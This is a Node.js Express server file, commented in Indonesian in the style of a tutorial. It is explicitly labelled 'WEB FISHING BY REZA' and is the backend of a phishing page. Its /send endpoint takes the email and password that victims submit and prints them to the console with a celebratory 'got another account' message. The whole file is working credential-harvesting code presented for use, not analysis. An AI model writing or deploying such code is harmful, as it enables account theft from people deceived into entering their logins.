const fs = require("fs");
//Jangan lupa tambahkan require baru express atau panggil express
const express = require("express");
const JsonDB = require("simple-json-db");
const db_file = new JsonDB("./config/save_data.json");
const db = [];
//Require itu yang ada di folder node_modules

//Sekarang kita buat save data array nya pakai {}
//Kita gunakan fungsi fs
//Sebeum itu kita memerlukan sebuah module lagi yaitu express
//Kita execute atau jalankan startWeb
startWeb();

function startWeb(){
	const app = express();
	//Port nya bebas untuk menghubungkan ke host menggunakan port ini
	const port = 8080; //disini kita pakai 8080 default

	//Jangan lupa tambahkan variabel baru
	app.use(express.json());
	app.use(express.static("./express"));

	//Gunakan fungsi app diatas port
	app.get("/", (req, res) => {
		//Kita buat dulu index.htmlnya
		//Bisa juga kita makai css buat layouting design webnya
		//Kita tampilkan html kita di express ini
		res.render("index.html");
	});

	app.get("/send", (req, res) => {
		//Menampilkan isi req dan res
		//Nah menampilkan isi dari input email & password tadi
		//res.query
		//console.log(req);
		//Buat variabel email dan password
		let email = req.query.email;
		let password = req.query.password;
		console.log("\n\nYeay dapat Akun Lagi!\nEmail: " + email + "\nPassword: " + password);
		//Diatas adalah baris untuk menampilkan isi dari input dari web
	});

	//Kita nyalakan web nya atau host nya
	app.listen(port, () => {
		console.log("Web berjalan pada https://localhost:" + port);
		console.log("=========[WEB FISHING BY REZA]=========")
	});
	//sambil menunggu chrome dibuka
	//Jadi fungsi dari css tadi untuk mendekorasi web kita
}